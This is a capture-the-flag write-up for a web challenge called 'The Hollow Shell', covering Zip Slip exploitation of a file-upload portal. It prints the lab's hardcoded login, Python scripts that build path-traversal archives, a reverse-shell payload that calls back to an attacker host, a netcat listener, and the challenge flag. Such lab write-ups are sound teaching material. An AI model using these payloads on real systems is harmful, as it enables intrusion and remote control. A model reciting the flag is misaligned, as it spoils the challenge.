# Title: The Hollow Shell

#### Category: Web

#### Difficulty: Medium

#### Description: 

You find it on the beach: pretty, ordinary, the kind of thing nobody thinks to check. Slip something inside and hold it to your ear. 

---

## Task 1: Hacker Holidays: Day 10

<img width="939" height="881" alt="image" src="https://github.com/user-attachments/assets/d87e444a-54bd-4c18-8072-047af299e6b3" />

<img width="945" height="460" alt="image" src="https://github.com/user-attachments/assets/6dd03748-8b7d-4e94-a65e-e770e761b239" />

#### Analysis: 

The challenge hints at a file upload vulnerability. The phrases "Slip something inside" and "hold it to your ear" suggest that uploaded files are not only stored but are also processed by the server. Combined with the clue about a shell, this points toward abusing the upload functionality to execute arbitrary code.

As I progressed through the challenge, I discovered that the application was vulnerable to Zip Slip, a directory traversal vulnerability that allows files inside a ZIP archive to be extracted outside of the intended directory. By exploiting this weakness, I was able to place a malicious Python file into the application's hooks directory, which was later executed by the server, resulting in a reverse shell.

---

### Methodology

#### Step 1 – Enumerate the Target

I started by performing an Nmap scan.

```nmap -Pn -sC -sV <VICTIM_IP>```

This reveals the open ports and running services.

Expected output:

```
  22/tcp    SSH
  5000/tcp  HTTP 
```
Since HTTP is running on port 5000, accessing only the IP address won't display the website.

Instead, browse to:

```http://<VICTIM_IP>:5000```

<img width="1349" height="926" alt="image" src="https://github.com/user-attachments/assets/3a36fde4-4953-47eb-a68f-2a0489852266" />



#### Step 2 – Inspect the Website

After loading the website, I inspected its source code.

I immediately found hardcoded credentials.

```
  user: concierge
  pass: StayNoticed2024!
```
<img width="1707" height="717" alt="image" src="https://github.com/user-attachments/assets/f59d3707-7072-4b08-a6c3-0aa0a70f8d65" />

I also noticed that the application references a static directory.

This is useful information because hidden directories often become targets later during exploitation.

Login using the credentials.

<img width="1592" height="654" alt="image" src="https://github.com/user-attachments/assets/2354351c-b1b1-468c-b069-a73354311c52" />


#### Step 3 – Understand the Upload Functionality
After logging in, the application explains how uploads work.

It accepts a ZIP archive containing a file named:
> shell.json

The upload page also mentions automation hooks, suggesting the application may execute files stored inside a hooks directory.

From this point, I suspected the application might contain directories such as:

- static/
- shells/
- hooks/

Before attempting exploitation, I decided to understand exactly how uploads were processed.


#### Step 4 – Create a Test Shell

First, I created the minimum valid manifest.

Command:
```printf '%s\n' '{"name":"test","assets":[]}' > shell.json```

Verify it.

Command:
```cat shell.json```

<img width="504" height="281" alt="image" src="https://github.com/user-attachments/assets/fe13f7bd-e6cb-4f52-997c-252d6b3d5988" />


Compress it into a ZIP archive.
```zip test.zip shell.json```

Verify the archive.
```unzip -l test.zip```

<img width="469" height="369" alt="image" src="https://github.com/user-attachments/assets/354340bb-cfdd-433e-ab77-13061d5520e4" />

Everything looks correct.


#### Step 5 – Upload the Test Archive

<img width="1041" height="822" alt="image" src="https://github.com/user-attachments/assets/8a815511-fe54-4d83-81bb-ecc91b8177b3" />

After uploading the archive, the application responds with:
> Shell 'test' brought ashore. Stored at shells/614ba0ea5bb2/ and held to the room's ear.

<img width="1028" height="904" alt="image" src="https://github.com/user-attachments/assets/4612a4ce-2a91-4327-908c-4654ec26caff" />

This tells us two important things:

- Uploaded shells are extracted into a shells/ directory.
- The server reads the uploaded shell.json after extraction.

Browsing to:

```http://<VICTIM_IP>:5000/shells/<random>/shell.json```

<img width="755" height="370" alt="image" src="https://github.com/user-attachments/assets/f2ea8db0-907d-4f14-b3da-aee40033cdf2" />

confirms that the uploaded file is publicly accessible.

At this point, I know exactly where uploaded files are extracted.


#### Step 6 – Test for Zip Slip

The challenge description contains another important clue:
> "Slip past what the portal forgets to check."

This strongly suggests Zip Slip.

Zip Slip is a directory traversal vulnerability where a ZIP archive contains filenames like:
```  ../../static/proof.css```

Instead of remaining inside the extraction directory, the application writes the file outside of it.

To test this, I created the following Python script.
``` nano zipslip-test.py```

```
import json
import zipfile

manifest = {
    "name": "zipslip-proof",
    "assets": []
}

with zipfile.ZipFile("zipslip-proof.zip", "w") as archive:
    archive.writestr("shell.json", json.dumps(manifest))
    archive.writestr(
        "../../static/zipslip-proof.css",
        "ZIP_SLIP_CONFIRMED\n"
    )

print("Created zipslip-proof.zip")
```
Why are there two files?

The ZIP archive intentionally contains two files.

> shell.json
- Required by the application.
- Makes the uploaded archive appear legitimate.

> ../../static/zipslip-proof.css
- Attempts to escape the upload directory.
- If successful, it writes a file directly into the application's static directory.

The reason for using a .css file is simply because the application already serves files from /static (such as style.css). Any readable file would work, but using another CSS file blends naturally with the existing application.


<img width="653" height="521" alt="image" src="https://github.com/user-attachments/assets/ef91ce8e-411e-4728-84b8-68c5d8db247d" />

Generate the archive.
``` python3 zipslip-test.py ```

Check its contents.
``` unzip -l zipslip-proof.zip ```

<img width="646" height="429" alt="image" src="https://github.com/user-attachments/assets/6f4e7c9b-ad05-43b2-80af-997470a49551" />


#### Step 7 – Confirm the Vulnerability

Upload the ZIP archive.

Then browse to:
```http://<VICTIM_IP>:5000/static/zipslip-proof.css```

If the page displays:
> ZIP_SLIP_CONFIRMED

<img width="818" height="285" alt="image" src="https://github.com/user-attachments/assets/c0189c5c-11fb-43f2-aca2-3e7572339e80" />

then the server is vulnerable to Zip Slip.

The application extracted my second file outside of the intended upload directory.


#### Step 8 – Build the Reverse Shell

Now that I confirmed directory traversal works, I targeted the hooks directory.

I created another Python script.
```nano reverse_shell.py```

Paste the provided script.

Replace:
> LHOST = "<ATTACKER_IP>"

```
import json
import zipfile

LHOST = "<ATTACKER_IP>"
LPORT = 4444

manifest = {
    "name": "shoreline-update",
    "assets": []
}

callback = f'''
import os
import pty
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(({LHOST!r}, {LPORT}))

for descriptor in (0, 1, 2):
    os.dup2(sock.fileno(), descriptor)

pty.spawn("/bin/bash")
'''

with zipfile.ZipFile("reverse-shell.zip", "w") as archive:
    archive.writestr("shell.json", json.dumps(manifest))
    archive.writestr("../../hooks/callback.py", callback)

print("Created reverse-shell.zip")
```

The script creates another ZIP archive containing:

 - shell.json
- ../../hooks/callback.py

Unlike the previous proof-of-concept, the second file is now a Python reverse shell.

When extracted into the hooks directory, the application automatically executes it.

Generate the archive.
```python3 reverse_shell.py```

Verify its contents.
```unzip -l reverse-shell.zip```

<img width="499" height="359" alt="image" src="https://github.com/user-attachments/assets/31e2ce31-cc93-473a-8f68-1897bfd0aa00" />


#### Step 9 – Receive the Reverse Shell

Start a Netcat listener.

```nc -lvnp 4444```

After uploading, the server executes the callback.

Your Netcat listener receives a shell.

You now have remote access to the target.

<img width="1479" height="892" alt="image" src="https://github.com/user-attachments/assets/7e86ec2c-ddf9-4d59-99a4-a333081b3d00" />


#### Step 10 – Retrieve the Flag

List the current directory.

<img width="660" height="233" alt="image" src="https://github.com/user-attachments/assets/ec185cfb-8878-416c-81b3-ac03f517504b" />

```ls```

<img width="542" height="201" alt="image" src="https://github.com/user-attachments/assets/46c5474d-20f1-4e62-a700-8692f0ae7e67" />

To quickly search for the flag, run:

``` cat /*/*/flag.txt ```

If the flag has a different filename or is stored deeper in the filesystem, you may need to enumerate manually.

<img width="526" height="240" alt="image" src="https://github.com/user-attachments/assets/32fc2301-fcc7-41d9-a7cb-9e33324ffa18" />

In this challenge, the command successfully prints the flag.

---

### Today's Itinerary

1. Find the flag
> Exploit the vulnerability to place a malicious hook, obtain a reverse shell, and retrieve the flag.

---

### Flag
> THM{z1p---sh3ll}


This challenge demonstrates how an insecure file extraction process can lead to remote code execution. Although the application validates that uploaded archives contain a shell.json file, it fails to sanitize file paths during extraction. By abusing this Zip Slip vulnerability, I escaped the intended upload directory, wrote a malicious Python script into the application's hooks directory, and leveraged the application's own automation mechanism to execute it. This ultimately provided a reverse shell, allowing me to access the system and retrieve the flag.
